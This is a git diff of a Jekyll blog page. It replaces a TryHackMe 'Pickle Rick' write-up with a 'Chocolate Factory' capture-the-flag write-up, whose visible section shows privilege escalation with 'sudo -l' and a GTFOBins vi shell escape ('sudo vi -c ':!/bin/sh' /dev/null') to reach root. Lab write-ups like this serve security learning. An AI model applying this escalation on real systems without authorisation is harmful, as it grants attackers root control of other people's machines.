 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo -l
-$ sudo bash
 </code></pre></div></div>
 
-<p>Now we can reach the third ingredient and save rick.</p>
+<p><img src="/assets/img/tryhackme/chocolate-factory/sudo-l.png" alt="sudo-l"></p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ls -la /root
-$ cat /root/3rd.txt
+<p>We can get root privileges using vi. I’m going to <a href="https://gtfobins.github.io/gtfobins/vi/">gtfobins</a> and see what I can do with vi.</p>
+
+<p><img src="/assets/img/tryhackme/chocolate-factory/gtfobins.png" alt="gtfobins"></p>
+
+<p>Now, we can root privilege using this command.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo vi -c ':!/bin/sh' /dev/null
 </code></pre></div></div>
 
-<p><img src="/assets/img/tryhackme/pickle_rick/3rd.png" alt="3rd"></p>
+<p><img src="/assets/img/tryhackme/chocolate-factory/privesc.png" alt="privesc"></p>
 
-<p><strong>Answer : <code class="language-plaintext highlighter-rouge">**********</code></strong></p>
+<p>We are inside. Let’s get the root flag.</p>
+
+<p><img src="/assets/img/tryhackme/chocolate-factory/root-flag.png" alt="root-flag"></p>
 
 <p><br></p>
 
@@ -854,7 +932,7 @@ $ cat /root/3rd.txt
   </div>
   <div class="post__footer">
     <p class="post__date">
-      <i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i>  Mar 15, 2023</p>
+      <i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i>  Mar 29, 2023</p>
     <div class="post__categories">
       
       
@@ -867,11 +945,7 @@ $ cat /root/3rd.txt
         <span class="post__tags__title"><i class="fas fa-fw fa-tags" aria-hidden="true"></i>Tags: </span>
         <span class="post__tags-container">
           
-          <span class="post__tags-item">ctf,</span>
-          
-          <span class="post__tags-item">gobuster,</span>
-          
-          <span class="post__tags-item">linux</span>
+          <span class="post__tags-item">ctf, privesc, stego</span>
           
         </span>
       </p>
@@ -881,12 +955,12 @@ $ cat /root/3rd.txt
 </div>
 <br>
 <!-- Twitter Share Button -->
-<a href="https://twitter.com/intent/tweet?text=TryHackMe%20-%20Pickle%20Rick&url=http://localhost:4000/tryhackme-pickle-rick/&amp;via=Mr0Wido" target="_blank" rel="noopener noreferrer" class="share-btn tweet-btn" title="Share on Twitter">
+<a href="https://twitter.com/intent/tweet?text=TryHackMe%20Chocolate%20Factory&url=http://localhost:4000/tryhackme-chocolate-factory/&amp;via=Mr0Wido" target="_blank" rel="noopener noreferrer" class="share-btn tweet-btn" title="Share on Twitter">
     Tweet
 </a>
   
 <!-- LinkedIn Share Button -->
-<a href="https://www.linkedin.com/sharing/share-offsite/?url=http://localhost:4000/tryhackme-pickle-rick/" target="_blank" rel="noopener noreferrer" class="share-btn" title="Share on LinkedIn">
+<a href="https://www.linkedin.com/sharing/share-offsite/?url=http://localhost:4000/tryhackme-chocolate-factory/" target="_blank" rel="noopener noreferrer" class="share-btn" title="Share on LinkedIn">
     LinkedIn
 </a>
   
@@ -898,8 +972,8 @@ $ cat /root/3rd.txt
 <div id="disqus_thread"></div>
 <script>
     var disqus_config = function () {
-    this.page.url = 'http://localhost:4000/tryhackme-pickle-rick/';
-    this.page.identifier = '/tryhackme-pickle-rick';
+    this.page.url = 'http://localhost:4000/tryhackme-chocolate-factory/';
+    this.page.identifier = '/tryhackme-chocolate-factory';
     
     };
 
@@ -938,15 +1012,15 @@ $ cat /root/3rd.txt
   {
     "@context": "https://schema.org",
     "@type": "Article",
-    "headline": "TryHackMe - Pickle Rick",
+    "headline": "TryHackMe Chocolate Factory",
     "author": {
       "@type": "Person",
       "name": ""
     },
-    "datePublished": "2023-03-15 00:00:00 +0300",
+    "datePublished": "2023-03-29 00:00:00 +0300",
     "mainEntityOfPage": {
       "@type": "WebPage",
-      "@id": "http://localhost:4000/tryhackme-pickle-rick/"
+      "@id": "http://localhost:4000/tryhackme-chocolate-factory/"
     },
     "articleSection": "TryHackMe"
   }
